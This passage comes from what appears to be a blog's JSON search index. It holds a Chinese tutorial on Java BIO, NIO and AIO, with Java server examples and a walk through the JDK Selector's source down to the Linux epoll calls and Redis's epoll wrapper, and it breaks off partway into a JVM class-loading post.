new ArrayList&lt;&gt;();    while(iterator.hasNext())&#123;        res.add(iterator.next());    &#125;    return new Result(200,&quot;OK&quot;,res);&#125;\n\n查询条件可以使用MultiMatchQueryBuilder说明我们要在哪些字段进行查询\n然后把这个MultiMatchQueryBuilder放在postRepository.search(multiMatchQueryBuilder)中就可以了\n而更新是删除和添加一起的合作\n","tags":["2021"]},{"title":"IO模型","url":"/2021/09/19/2021/IO%E6%A8%A1%E5%9E%8B/","content":"\n\nJava中的三种IO模型BIOBIO 有的称之为 Iasic(基本) IO，有的称之为 Block(阻塞) IO，主要应用于文件 IO 和网络 IO，本文主要讲述网络 IO。\n 在 JDK1.4 之前，我们建立网络连接的时候只能采用 BIO，需要先在服务端启动一个 ServerSocket，然后在客户端启动 Socket 来对服务端进行通信，默认情况下服务端需要对每个请求建立一个线程等待请求，而客户端发送请求后，先咨询服务端是否有线程响应，如果没有则会一直等待或者遭到拒绝，如果有的话，客户端线程会等待请求结束后才继续执行，这就是阻塞式 IO。\n我们看一个简单的案例：\n\n服务端\n\npublic class Server &#123;    public static void main(String[] args) throws IOException &#123;        // 创建ServerSocket，指定端口号        ServerSocket serverSocket = new ServerSocket(8888);        while (true) &#123;            System.out.println(&quot;等待连接...&quot;);            // 通过accept阻塞等待Socket连接，只有客户端连接后才能继续向下执行            Socket clientSocket = serverSocket.accept();            System.out.println(&quot;有客户端连接了..&quot;);            // 通过handler方法处理客户端连接            // handler(clientSocket);            // 也可以给每个客户端连接单独创建一个，一个客户端分配一个线程服务            new Thread(new Runnable() &#123;                @Override                public void run() &#123;                    try &#123;                        handler(clientSocket);                    &#125; catch (IOException e) &#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;).start();        &#125;    &#125;    private static void handler(Socket clientSocket) throws IOException &#123;        byte[] bytes = new byte[1024];        System.out.println(&quot;准备读取数据&quot;);        // 通过输入流阻塞读取客户端发来的数据，如果客户端一直保持连接，但是没发数据，程序就会卡在这里        // 1.如果读到了消息，那么返回值&gt;0        // 2.如果客户端正常断开连接，那么返回值=-1        int read = clientSocket.getInputStream().read(bytes);        System.out.println(&quot;数据读取完毕&quot;);        // 如果读到了数据        if (read != -1) &#123;            // 打印数据            System.out.println(&quot;接收到客户端的数据：&quot; + new String(bytes, 0, read));        &#125;    &#125;&#125;\n\nsocket.accept()、socket.read()、socket.write()三个主要函数都是同步阻塞的，当一个连接在处理I&#x2F;O的时候，系统是阻塞的，如果是单线程的话必然就挂死在那里；\n但CPU是被释放出来的，开启多线程，就可以让CPU去处理更多的事情。\n其实这也是所有使用多线程的本质： 1. 利用多核。 2. 当I&#x2F;O阻塞系统，但CPU空闲的时候，可以利用多线程使用CPU资源。\n现在的多线程一般都使用线程池，可以让线程的创建和回收成本相对较低。在活动连接数不是特别高（小于单机1000）的情况下，这种模型是比较不错的，可以让每一个连接专注于自己的I&#x2F;O并且编程模型简单，也不用过多考虑系统的过载、限流等问题。线程池本身就是一个天然的漏斗，可以缓冲一些系统处理不了的连接或请求。\n不过，这个模型最本质的问题在于，严重依赖于线程。\n但线程是很”贵”的资源，主要表现在： \n\n线程的创建和销毁成本很高，在Linux这样的操作系统中，线程本质上就是一个进程。创建和销毁都是重量级的系统函数。 \n线程本身占用较大内存，像Java的线程栈，一般至少分配512K～1M的空间，如果系统中的线程数过千，恐怕整个JVM的内存都会被吃掉一半。 \n线程的切换成本是很高的。操作系统发生线程切换的时候，需要保留线程的上下文，然后执行系统调用。如果线程数过高，可能执行线程切换的时间甚至会大于线程执行的时间，这时候带来的表现往往是系统load偏高、CPU sy使用率特别高（超过20%以上)，导致系统几乎陷入不可用的状态。\n容易造成锯齿状的系统负载。因为系统负载是用活动线程数或CPU核心数，一旦线程数量高但外部网络环境不是很稳定，就很容易造成大量请求的结果同时返回，激活大量阻塞线程从而使系统负载压力过大。\n\n所以，当面对十万甚至百万级连接的时候，传统的BIO模型是无能为力的。随着移动端应用的兴起和各种网络游戏的盛行，百万级长连接日趋普遍，此时，必然需要一种更高效的I&#x2F;O处理模型。                                                                                                                               \nBIO的缺点：\n\n上述IO代码里read和accept操作都是阻塞的，如果服务端只有一个线程，那么等待read数据时就无法accept客户端连接；等待客户端连接时也无法读数据。\n如果给每个连接分配一个线程，会导致服务器线程太多，压力太大。\n只要客户端连接不断开，无论是否收发数据，都会一直占用该线程，导致资源浪费。\n\nNIONIO全称Non-blocking IO或New IO，是 JDK 提供的新 API。从 JDK1.4 开始，Java 提供了一系列改进的输入&#x2F;输出的新特性，被统称为 NIO。新增了许多用于处理输入输出的类，这些类都被放在java.nio包及子包下，并且对原 java.io包中的很多类进行改写，新增了满足 NIO 的功能。\nNIO是一种同步非阻塞的IO方式，服务器实现模式为一个线程可以处理多个连接，客户端发送的连接请求都会注册到多路复用器selector上，多路复用器轮询到连接有IO请求就进行处理。\n简单案例我们先看一个没有引入多路复用器的案例：\n\n服务端\n\npublic class NioServer &#123;    // 保存客户端连接    static List&lt;SocketChannel&gt; channelList = new ArrayList&lt;&gt;();    public static void main(String[] args) throws IOException, InterruptedException &#123;        // 创建NIO中的ServerSocketChannel,与BIO的serverSocket类似        ServerSocketChannel serverSocket = ServerSocketChannel.open();        // 绑定端口        serverSocket.socket().bind(new InetSocketAddress(8888));        // 设置ServerSocketChannel为非阻塞模式        serverSocket.configureBlocking(false);        System.out.println(&quot;服务启动成功&quot;);        // 核心代码        while (true) &#123;            // 非阻塞模式下accept方法不会阻塞，否则会阻塞            // NIO的非阻塞是由操作系统内部实现的，底层调用了linux内核的accept函数            SocketChannel socketChannel = serverSocket.accept();            // 如果有客户端进行连接            if (socketChannel != null) &#123;                 System.out.println(&quot;连接成功&quot;);                // 设置客户端SocketChannel为非阻塞                socketChannel.configureBlocking(false);                // 保存客户端连接在List中                channelList.add(socketChannel);            &#125;            // 遍历连接进行数据读取            Iterator&lt;SocketChannel&gt; iterator = channelList.iterator();            while (iterator.hasNext()) &#123;                SocketChannel sc = iterator.next();                ByteBuffer byteBuffer = ByteBuffer.allocate(128);                // 客户端非阻塞模式下read方法不会阻塞，否则会阻塞                int len = sc.read(byteBuffer);                // 如果有数据，把数据打印出来                if (len &gt; 0) &#123;                    System.out.println(&quot;接收到消息：&quot;                                       + new String(byteBuffer.array(),0,len));                // 如果客户端断开，把socket从集合中去掉                &#125; else if (len == -1) &#123;                     iterator.remove();                    System.out.println(&quot;客户端断开连接&quot;);                &#125;            &#125;        &#125;    &#125;&#125;\n\n\n\n可以看到上面的代码中，accept等待连接和read读取数据的方法都可以设置为非阻塞，那么这样就可以实现一个线程不阻塞地处理多个请求的连接和数据读取事件。\n但是按照上面地方式，如果连接数太多的话，会有大量的无效遍历。假如有10000个连接，其中只有100个连接有写数据，但是由于其他9900个连接并没有断开，我们还是要每次轮询遍历10000次，其中有99%的遍历都是无效的，这显然不是一个让人很满意的状态。那么如何解决？\n引入多路复用器public class NioSelectorServer &#123;    public static void main(String[] args) throws IOException, InterruptedException &#123;        // 创建NIO ServerSocketChannel        ServerSocketChannel serverSocket = ServerSocketChannel.open();        // 绑定端口        serverSocket.socket().bind(new InetSocketAddress(9000));        // 设置ServerSocketChannel为非阻塞        serverSocket.configureBlocking(false);        // 创建Selector多路复用器        Selector selector = Selector.open();        // 把ServerSocketChannel注册到selector上        // 并且设置对客户端连接事件感兴趣        serverSocket.register(selector, SelectionKey.OP_ACCEPT);        System.out.println(&quot;服务启动成功&quot;);        while (true) &#123;            // 阻塞等待需要处理的事件发生            selector.select();            // 获取selector中注册的全部事件的SelectionKey实例            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();            Iterator&lt;SelectionKey&gt; iterator = selectionKeys.iterator();            // 遍历SelectionKeys对事件进行处理            while (iterator.hasNext()) &#123;                SelectionKey key = iterator.next();                // 如果是OP_ACCEPT事件，则说明是客户端连接事件                if (key.isAcceptable()) &#123;                    // 获取客户端ServerSocketChannel                    ServerSocketChannel server = (ServerSocketChannel) key.channel();                    SocketChannel socketChannel = server.accept();                    socketChannel.configureBlocking(false);                    // 将客户端连接也注册到Selector上，并且对读事件感兴趣                    // 这里的读事件是相对于服务端来说的，而不是客户端读数据                    socketChannel.register(selector, SelectionKey.OP_READ);                    System.out.println(&quot;客户端连接成功&quot;);                // 如果是OP_READ事件，则说明客户端发来数据                &#125; else if (key.isReadable()) &#123;                      SocketChannel socketChannel = (SocketChannel) key.channel();                    ByteBuffer byteBuffer = ByteBuffer.allocate(128);                    int len = socketChannel.read(byteBuffer);                    // 如果有数据，把数据打印出来                    if (len &gt; 0) &#123;                        System.out.println(&quot;接收到消息：&quot;                                           + new String(byteBuffer.array(),0,len));                    // 如果客户端断开连接，关闭连接                        &#125; else if (len == -1) &#123;                         System.out.println(&quot;客户端断开连接&quot;);                        socketChannel.close();                    &#125;                &#125;                // 从事件集合里删除本次处理的key，防止下次重复处理                iterator.remove();            &#125;        &#125;    &#125;&#125;\n\n可以看到，引入了多路复用器Selector后，所有的SocketChannel（包括服务端）都会注册到Selector上，通过Selector的select方法就可以获取到所有注册过的SocketChannel发生的所有事件，然后对这些事件处理即可：\n也就是我们不是遍历，而是客户端发请求过来 我这边会把它的信息注册到selector实例中\n\n这样就省略了对所有连接的遍历，只需要处理发生的事件即可，效率大大提高。那这个多路复用器是如何实现的？我们后面介绍。\nAIOJDK 7 引入了 Asynchronous IO，即 AIO。AIO是一种异步非阻塞的IO方式， 由操作系统完成后回调通知服务端程序启动线程去处理， 一般适用于连接数较多且连接时间较长的应用。看一个简单的案例：\n\n服务端\n\npublic class AIOServer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建AsynchronousServerSocketChannel对象        final AsynchronousServerSocketChannel serverChannel =                AsynchronousServerSocketChannel.open().bind(new InetSocketAddress(9000));        // 通过accept方法异步获取连接        serverChannel.accept(null,                              // 传入一个回调                             new CompletionHandler&lt;AsynchronousSocketChannel, Object&gt;() &#123;                        // 如果成功获取到连接，AIO会回调这个方法            // 并且直接将连接AsynchronousSocketChannel放在了参数中，无须手动获取            @Override            public void completed(AsynchronousSocketChannel socketChannel,                                   Object attachment) &#123;                try &#123;                    // 再此接收客户端连接，如果不写这行代码后面的客户端连接连不上服务端                    serverChannel.accept(attachment, this);                    System.out.println(socketChannel.getRemoteAddress());                    ByteBuffer buffer = ByteBuffer.allocate(1024);                                        // 通过read方法读取数据，同样是异步的                    socketChannel.read(buffer,                                        buffer,                                       // 传入一个回调                                       new CompletionHandler&lt;Integer, ByteBuffer&gt;() &#123;                        @Override                        public void completed(Integer result, ByteBuffer buffer) &#123;                            // 需要手动调用flip方法                            // 将ByteBuffer从写模式变成读模式                            buffer.flip();                            // 读取数据                            System.out.println(new String(buffer.array(), 0, result));                        &#125;                        @Override                        public void failed(Throwable exc, ByteBuffer buffer) &#123;                            exc.printStackTrace();                        &#125;                    &#125;);                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;            // 失败回调            @Override            public void failed(Throwable exc, Object attachment) &#123;                exc.printStackTrace();            &#125;        &#125;);        Thread.sleep(Integer.MAX_VALUE);    &#125;&#125;\n\n\n客户端\n\npublic class AIOClient &#123;    public static void main(String... args) throws Exception &#123;        // 创建AsynchronousSocketChannel        AsynchronousSocketChannel socketChannel = AsynchronousSocketChannel.open();        // 这里的连接也是异步的，通过get阻塞等待连接完成        socketChannel.connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 9000)).get();        // 写数据        socketChannel.write(ByteBuffer.wrap(&quot;HelloServer&quot;.getBytes()));    &#125;&#125;\n\n对比BIO、 NIO、 AIO 对比：\n\n为什么Netty使用NIO而不是AIO？\n在Linux系统上，AIO的底层实现仍使用Epoll，没有很好实现AIO，因此在性能上没有明显的优势，而且被JDK封装了一层不容易深度优化，Linux上AIO还不够成熟。Netty是异步非阻塞框架，Netty在NIO上做了很多异步的封装。\n多路复用器的原理NIO中的多路复用器Selector是如何实现的？它是如何做到只保存事件的？\nEpoll简介\n本文仅针对Linux系统，因为服务几乎都是部署在Linux上的。对于多路复用器来说，Window、Mac、Linux底层的实现各不相同。\n\nSelector底层的实现为Linux中的epoll，其实Selector就是对epoll的封装。\nepoll 是Linux内核中的一种可扩展IO事件处理机制，最早在 Linux 2.5.44 内核中引入，可被用于代替select和poll系统调用，并且在具有大量应用程序请求时能够获得较好的性能（此时被监视的文件描述符数目非常大，与旧的 select 和 poll 系统调用完成操作所需O(n)不同， epoll能在O(1)时间内完成操作，所以性能相当高），epoll向用户空间提供了自己的文件描述符来进行操作。\nepoll是Linux内核为处理大批量文件描述符而作了改进的poll，是Linux下多路复用IO接口select&#x2F;poll的增强版本，它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。\n另一点原因就是**epoll获取事件的时候，它无须遍历整个被侦听的描述符集，只要遍历那些被内核IO事件异步唤醒而加入Ready队列的描述符集合就行了**。\n\n\n\n\nselect\npoll\nepoll(jdk 1.5及以上)\n\n\n\n操作方式\n遍历\n遍历\n回调\n\n\n底层实现\n数组\n链表\n哈希表&lt;key,value&gt;\n\n\nIO效率\n每次调用都进行线性遍历，时间复杂度为O(n)\n每次调用都进行线性遍历，时间复杂度为O(n)\n事件通知方式，每当有IO事件就绪，系统注册的回调函数就会被调用，时间复杂度O(1)\n\n\n最大连接\n有上限\n无上限\n无上限\n\n\nSelector源码分析Selector的三个重要方法为open，register和select。我们一个一个分析\nopen方法Selector的open方法创建Selector：\npublic static Selector open() throws IOException &#123;    // 先调用SelectorProvider的provider方法获取一个SelectorProvider    // 再通过SelectorProvider获取Selctor    return SelectorProvider.provider().openSelector();&#125;\n\nSelectorProvider的provider方法：\npublic static SelectorProvider provider() &#123;    synchronized (lock) &#123;        if (provider != null)            return provider;        return AccessController.doPrivileged(            new PrivilegedAction&lt;SelectorProvider&gt;() &#123;                public SelectorProvider run() &#123;                        if (loadProviderFromProperty())                            return provider;                        if (loadProviderAsService())                            return provider;                        // 这里最终调用DefaultSelectorProvider的create方法                        // 创建一个SelectorProvider                        provider = sun.nio.ch.DefaultSelectorProvider.create();                        return provider;                    &#125;                &#125;);    &#125;&#125;\n\nDefaultSelectorProvider的create方法：\npublic static SelectorProvider create() &#123;    // Windows下返回的是WindowsSelectorProvider    return new WindowsSelectorProvider();&#125;\n\n到这里，由于现在使用的是Windows系统，所以实现类是WindowsSelectorProvider。我们到OpenJDK的源码里面找到Linux系统下的实现类EPollSelectorProvider：\npublic class EPollSelectorProvider extends SelectorProviderImpl &#123;    // 获取Selector    public AbstractSelector openSelector() throws IOException &#123;        // 返回EPollSelectorImpl对象，它就Linux中Selector的实现类        return new EPollSelectorImpl(this);    &#125;&#125;\n\n在Linux系统下，Selector的实现类为EPollSelectorImpl：\n// 构造方法EPollSelectorImpl(SelectorProvider sp) throws IOException &#123;    super(sp);    long pipeFds = IOUtil.makePipe(false);    fd0 = (int) (pipeFds &gt;&gt;&gt; 32);    fd1 = (int) pipeFds;    // 创建EPollArrayWrapper对象    pollWrapper = new EPollArrayWrapper();    pollWrapper.initInterrupt(fd0, fd1);    fdToKey = new HashMap&lt;&gt;();&#125;\n\n接着又创建了EPollArrayWrapper对象：\nEPollArrayWrapper() throws IOException &#123;    // 调用epollCreate方法    epfd = epollCreate();    // the epoll_event array passed to epoll_wait    int allocationSize = NUM_EPOLLEVENTS * SIZE_EPOLLEVENT;    pollArray = new AllocatedNativeObject(allocationSize, true);    pollArrayAddress = pollArray.address();    // eventHigh needed when using file descriptors &gt; 64k    if (OPEN_MAX &gt; MAX_UPDATE_ARRAY_SIZE)        eventsHigh = new HashMap&lt;&gt;();&#125;private native int epollCreate();\n\n然后调用了一个epollCreate方法，它是一个native方法，我们接着找到它的C语言实现：\nJNIEXPORT jint JNICALLJava_sun_nio_ch_EPollArrayWrapper_epollCreate(JNIEnv *env, jobject this)&#123;     // 调用linux的epoll_create函数得到一个文件描述符epfd     // 通过epfd可以找到linux中的该epoll对象    int epfd = epoll_create(256);    if (epfd &lt; 0) &#123;       JNU_ThrowIOExceptionWithLastError(env, &quot;epoll_create failed&quot;);    &#125;    return epfd;&#125;\n\n最终调用了Linux系统函数epoll_create，返回了一个文件描述符（Linux中一切皆文件）。\nepoll_create函数epoll_create是Linux系统函数，它的作用是创建一个epoll实例，并返回一个非负数作为文件描述符，用于对epoll接口的所有后续调用。\n参数size代表可能会容纳size个描述符，但size不是一个最大值，只是提示操作系统它的数量级，现在这个参数基本上已经弃用了。\nregister方法第二个方法就是将连接通道注册到Selector上，SelectableChannel的register方法：\npublic final SelectionKey register(Selector sel, int ops) throws ClosedChannelException&#123;    // 调用子类AbstractSelectableChannel的register方法    return register(sel, ops, null);&#125;\n\nAbstractSelectableChannel的register方法：\npublic final SelectionKey register(Selector sel,                                   int ops,                                   Object att) throws ClosedChannelException&#123;    synchronized (regLock) &#123;        if (!isOpen())            throw new ClosedChannelException();        if ((ops &amp; ~validOps()) != 0)            throw new IllegalArgumentException();        if (blocking)            throw new IllegalBlockingModeException();        SelectionKey k = findKey(sel);        if (k != null) &#123;            k.interestOps(ops);            k.attach(att);        &#125;        if (k == null) &#123;            // New registration            synchronized (keyLock) &#123;                if (!isOpen())                    throw new ClosedChannelException();                // 调用SelectorImpl的register方法                k = ((AbstractSelector)sel).register(this, ops, att);                addKey(k);            &#125;        &#125;        return k;    &#125;&#125;\n\n调用SelectorImpl的register方法：\nprotected final SelectionKey register(AbstractSelectableChannel var1, int var2, Object var3) &#123;    if (!(var1 instanceof SelChImpl)) &#123;        throw new IllegalSelectorException();    &#125; else &#123;        // 创建SelectionKey        SelectionKeyImpl var4 = new SelectionKeyImpl((SelChImpl)var1, this);        var4.attach(var3);        synchronized(this.publicKeys) &#123;            // 调用implRegister方法注册SelectionKey            // Linux中调用的是EPollSelectorImpl的implRegister方法            this.implRegister(var4);        &#125;        var4.interestOps(var2);        return var4;    &#125;&#125;\n\nEPollSelectorImpl的implRegister方法：\nprotected void implRegister(SelectionKeyImpl ski) &#123;    if (closed)        throw new ClosedSelectorException();    SelChImpl ch = ski.channel;    int fd = Integer.valueOf(ch.getFDVal());    fdToKey.put(fd, ski);    // 这个fd就是SocketChannel    // 调用EPollArrayWrapper的add方法将该SocketChannel保存起来    pollWrapper.add(fd);    keys.add(ski);&#125;\n\n后面就不接着看了，register方法其实还没有真正将SocketChannel和多路复用器进行绑定，而是先将SocketChannel保存起来。\nselect方法最后就是Selector的select方法，在Linux系统下，会调用EPollSelectorImpl的doSelect方法：\nprotected int doSelect(long timeout) throws IOException &#123;    if (closed)        throw new ClosedSelectorException();    processDeregisterQueue();    try &#123;        begin();        // 调用EPollArrayWrapper的poll方法        pollWrapper.poll(timeout);    &#125; finally &#123;        end();    &#125;    processDeregisterQueue();    int numKeysUpdated = updateSelectedKeys();    if (pollWrapper.interrupted()) &#123;        // Clear the wakeup pipe        pollWrapper.putEventOps(pollWrapper.interruptedIndex(), 0);        synchronized (interruptLock) &#123;            pollWrapper.clearInterrupted();            IOUtil.drain(fd0);            interruptTriggered = false;        &#125;    &#125;    return numKeysUpdated;&#125;\n\nEPollArrayWrapper的poll方法：\nint poll(long timeout) throws IOException &#123;    // 调用updateRegistrations方法    updateRegistrations();    // 然后调用epollWait方法(native)从epoll中等待事件发生    updated = epollWait(pollArrayAddress, NUM_EPOLLEVENTS, timeout, epfd);    for (int i=0; i&lt;updated; i++) &#123;        if (getDescriptor(i) == incomingInterruptFD) &#123;            interruptedIndex = i;            interrupted = true;            break;        &#125;    &#125;    return updated;&#125;private void updateRegistrations() &#123;    synchronized (updateLock) &#123;        int j = 0;        // 遍历所有注册的SocketChannel        while (j &lt; updateCount) &#123;            int fd = updateDescriptors[j];            short events = getUpdateEvents(fd);            boolean isRegistered = registered.get(fd);            int opcode = 0;            if (events != KILLED) &#123;                if (isRegistered) &#123;                    opcode = (events != 0) ? EPOLL_CTL_MOD : EPOLL_CTL_DEL;                &#125; else &#123;                    opcode = (events != 0) ? EPOLL_CTL_ADD : 0;                &#125;                if (opcode != 0) &#123;                    // 调用epollCtl方法(native)真正注册SocketChannel                    epollCtl(epfd, opcode, fd, events);                    if (opcode == EPOLL_CTL_ADD) &#123;                        registered.set(fd);                    &#125; else if (opcode == EPOLL_CTL_DEL) &#123;                        registered.clear(fd);                    &#125;                &#125;            &#125;            j++;        &#125;        updateCount = 0;    &#125;&#125;private native void epollCtl(int epfd, int opcode, int fd, int events);private native int epollWait(long pollAddress, int numfds, long timeout,int epfd) throws IOException;\n\n最终调用了两个native方法，找到它们的c语言实现：\n// epollCtl方法JNIEXPORT void JNICALLJava_sun_nio_ch_EPollArrayWrapper_epollCtl(JNIEnv *env, jobject this, jint epfd,                                           jint opcode, jint fd, jint events)&#123;    struct epoll_event event;    int res;    event.events = events;    event.data.fd = fd;    // 调用linux系统函数epoll_ctl，把SocketChannel和epoll关联，真正实现注册    // epfd为epoll的文件描述符、opcode为操作符、fd为SocketChannel的文件描述符、event为事件    RESTARTABLE(epoll_ctl(epfd, (int)opcode, (int)fd, &amp;event), res);    /*     * A channel may be registered with several Selectors. When each Selector     * is polled a EPOLL_CTL_DEL op will be inserted into its pending update     * list to remove the file descriptor from epoll. The &quot;last&quot; Selector will     * close the file descriptor which automatically unregisters it from each     * epoll descriptor. To avoid costly synchronization between Selectors we     * allow pending updates to be processed, ignoring errors. The errors are     * harmless as the last update for the file descriptor is guaranteed to     * be EPOLL_CTL_DEL.     */    if (res &lt; 0 &amp;&amp; errno != EBADF &amp;&amp; errno != ENOENT &amp;&amp; errno != EPERM) &#123;        JNU_ThrowIOExceptionWithLastError(env, &quot;epoll_ctl failed&quot;);    &#125;&#125;// epollWait方法JNIEXPORT jint JNICALLJava_sun_nio_ch_EPollArrayWrapper_epollWait(JNIEnv *env, jobject this,                                            jlong address, jint numfds,                                            jlong timeout, jint epfd)&#123;    struct epoll_event *events = jlong_to_ptr(address);    int res;    if (timeout &lt;= 0) &#123;           /* Indefinite or no wait */        // 调用linux系统函数epoll_wait        // 获取epoll的rdlist中的事件，没有就阻塞等待        RESTARTABLE(epoll_wait(epfd, events, numfds, timeout), res);    &#125; else &#123;                      /* Bounded wait; bounded restarts */        res = iepoll(epfd, events, numfds, timeout);    &#125;    if (res &lt; 0) &#123;        JNU_ThrowIOExceptionWithLastError(env, &quot;epoll_wait failed&quot;);    &#125;    return res;&#125;\n\n这里又有两个linux系统函数：\nepoll_ctl函数事件注册函数，使用文件描述符epfd引用的epoll实例，对目标文件描述符fd执行op操作，成功返回0，失败返回-1：\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)\n\n其中参数说明如下：\n\nepfd：就是第一个epoll函数epoll_create返回的句柄\nfd：表示socket对应的文件描述符\nop：op是表示做什么动作，有以下几个值\nEPOLL_CTL_ADD：注册新的fd到epfd中，并关联事件event\nEPOLL_CTL_MOD：修改已经注册的fd的监听事件\nEPOLL_CTL_DEL：从epfd中移除fd，并且忽略掉绑定的event，这时event可以为null\n\n\nevent：表示epoll内核要监听什么事件，常用的有如下几种\nEPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）\nEPOLLOUT：表示对应的文件描述符可以写\nEPOLLPRI：表示对应的文件描述符有紧急的数据可读\nEPOLLERR：表示对应的文件描述符发生错误\nEPOLLHUP：表示对应的文件描述符被挂断\n\n\n\n其中参数event是一个结构体：\nstruct epoll_event &#123;   __uint32_t   events;      /* Epoll events */   epoll_data_t data;        /* User data variable */&#125;;\ttypedef union epoll_data &#123;   void        *ptr;   int          fd;   __uint32_t   u32;   __uint64_t   u64;&#125; epoll_data_t;\n\nepoll_wait函数用于等待事件的发生，返回值表示需要处理的事件数目：\nint epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);\n\n参数如下：\n\nepfd：等待文件描述符epfd上的事件，即等待epoll中的事件\nevents：存储epoll_wait操作完成后所有发生的事件\nmaxevents：表示当前要监听的所有socket句柄数，即最多等待多少个事件就返回\ntime_out：超时时间\n\nEpoll的原理Selector的源码并不复杂，主要围绕Linux中的epoll展开，主要调用了如下几个Linux系统函数：\n\nepoll_create：创建epoll对象\nepoll_ctl：注册socket到epoll对象上\nepoll_wait：从epoll上获取事件\n\n那么事件是如何添加到epoll上的？\n当机器的网卡接收到网络通信数据的时候，会产生一个硬件中断，中断服务子程序中就会将事件添加到epoll的就绪队列（rdlist）中，epoll_wait函数就是从epoll的就绪队列中获得对应的事件。\n这样就省去了遍历所有socket的过程，可以直接拿到所有事件，并且事件添加的过程是操作系统内核帮我们实现的，无须应用程序关心。\n总结\nRedis中的epoll之前在介绍Redis的时候，我们说Redis中用于处理客户端请求是单线程的，那它是如何有那么高的并发量的？其实Redis中也用到了epoll模型，在ae_epoll.c中就可以看到相关源码：\ntypedef struct aeApiState &#123;    int epfd;    struct epoll_event *events;&#125; aeApiState;static int aeApiCreate(aeEventLoop *eventLoop) &#123;    aeApiState *state = zmalloc(sizeof(aeApiState));    if (!state) return -1;    state-&gt;events = zmalloc(sizeof(struct epoll_event)*eventLoop-&gt;setsize);    if (!state-&gt;events) &#123;        zfree(state);        return -1;    &#125;    // epoll_create函数创建epoll    state-&gt;epfd = epoll_create(1024); /* 1024 is just a hint for the kernel */    if (state-&gt;epfd == -1) &#123;        zfree(state-&gt;events);        zfree(state);        return -1;    &#125;    eventLoop-&gt;apidata = state;    return 0;&#125;static int aeApiResize(aeEventLoop *eventLoop, int setsize) &#123;    aeApiState *state = eventLoop-&gt;apidata;    state-&gt;events = zrealloc(state-&gt;events, sizeof(struct epoll_event)*setsize);    return 0;&#125;static void aeApiFree(aeEventLoop *eventLoop) &#123;    aeApiState *state = eventLoop-&gt;apidata;    close(state-&gt;epfd);    zfree(state-&gt;events);    zfree(state);&#125;// 添加事件static int aeApiAddEvent(aeEventLoop *eventLoop, int fd, int mask) &#123;    aeApiState *state = eventLoop-&gt;apidata;    struct epoll_event ee = &#123;0&#125;; /* avoid valgrind warning */    /* If the fd was already monitored for some event, we need a MOD     * operation. Otherwise we need an ADD operation. */    int op = eventLoop-&gt;events[fd].mask == AE_NONE ?            EPOLL_CTL_ADD : EPOLL_CTL_MOD;    ee.events = 0;    mask |= eventLoop-&gt;events[fd].mask; /* Merge old events */    if (mask &amp; AE_READABLE) ee.events |= EPOLLIN;    if (mask &amp; AE_WRITABLE) ee.events |= EPOLLOUT;    ee.data.fd = fd;    // epoll_ctl函数添加事件    if (epoll_ctl(state-&gt;epfd,op,fd,&amp;ee) == -1) return -1;    return 0;&#125;// 删除事件static void aeApiDelEvent(aeEventLoop *eventLoop, int fd, int delmask) &#123;    aeApiState *state = eventLoop-&gt;apidata;    struct epoll_event ee = &#123;0&#125;; /* avoid valgrind warning */    int mask = eventLoop-&gt;events[fd].mask &amp; (~delmask);    ee.events = 0;    if (mask &amp; AE_READABLE) ee.events |= EPOLLIN;    if (mask &amp; AE_WRITABLE) ee.events |= EPOLLOUT;    ee.data.fd = fd;    if (mask != AE_NONE) &#123;        // epoll_ctl函数删除事件        epoll_ctl(state-&gt;epfd,EPOLL_CTL_MOD,fd,&amp;ee);    &#125; else &#123;        /* Note, Kernel &lt; 2.6.9 requires a non null event pointer even for         * EPOLL_CTL_DEL. */        epoll_ctl(state-&gt;epfd,EPOLL_CTL_DEL,fd,&amp;ee);    &#125;&#125;// 获取事件static int aeApiPoll(aeEventLoop *eventLoop, struct timeval *tvp) &#123;    aeApiState *state = eventLoop-&gt;apidata;    int retval, numevents = 0;    // epoll_wait函数获取事件    retval = epoll_wait(state-&gt;epfd,state-&gt;events,eventLoop-&gt;setsize,            tvp ? (tvp-&gt;tv_sec*1000 + tvp-&gt;tv_usec/1000) : -1);    if (retval &gt; 0) &#123;        int j;        numevents = retval;        for (j = 0; j &lt; numevents; j++) &#123;            int mask = 0;            struct epoll_event *e = state-&gt;events+j;            if (e-&gt;events &amp; EPOLLIN) mask |= AE_READABLE;            if (e-&gt;events &amp; EPOLLOUT) mask |= AE_WRITABLE;            if (e-&gt;events &amp; EPOLLERR) mask |= AE_WRITABLE;            if (e-&gt;events &amp; EPOLLHUP) mask |= AE_WRITABLE;            eventLoop-&gt;fired[j].fd = e-&gt;data.fd;            eventLoop-&gt;fired[j].mask = mask;        &#125;    &#125;    return numevents;&#125;static char *aeApiName(void) &#123;    return &quot;epoll&quot;;&#125;","tags":["2021"]},{"title":"JVM性能调优","url":"/2021/04/10/2021/JVM%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/","content":"\n\n类加载机制Java底层代码执行是需要类加载器\n当我们用java命令运行某个类的main函数启动程序时，首先需要通过类加载器把主类加载到JVM。\n通过Java命令执行代码的大体流程如下：\n\n其中引导类加载器获得其他的类加载器。再使用其他的类加载器来加载类。\n也就是其中的loadClass(&quot;xxxx&quot;)。类加载过程有如下几步： \n**加载 &gt;&gt; 验证 &gt;&gt; 准备 &gt;&gt; 解析 &gt;&gt; 初始化 &gt;&gt;使用 &gt;&gt; 卸载 **\n加载：在硬盘上查找并通过IO读入字节码文件，使用到类时才会加载，例如调用类的main()方法，new对象等等，在加载阶段会在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口\n验证：校验字节码文件的正确性 【cafe babe开头\n准备：给类的静态变量 、常量分配内存，并赋予默认值 \n解析：将符号引用替换为直接引用，该阶段会把一些静态方法(符号引用，比如main()方法)替换为指向数据所存内存的指针或句柄等(直接引用)，这是所谓的静态链接过程(类加载期间完成)，动态链接是在程序运行期间完成的将符号引用替换为直接引用。 \n初始化：对类的静态变量初始化为指定的值，执行静态代码块\n\n类被加载到方法区中后主要包含 运行时常量池、类型信息、字段信息、方法信息、类加载器的引用、对应class实例的引用等信息。 \n类加载器的引用：这个类到类加载器实例的引用 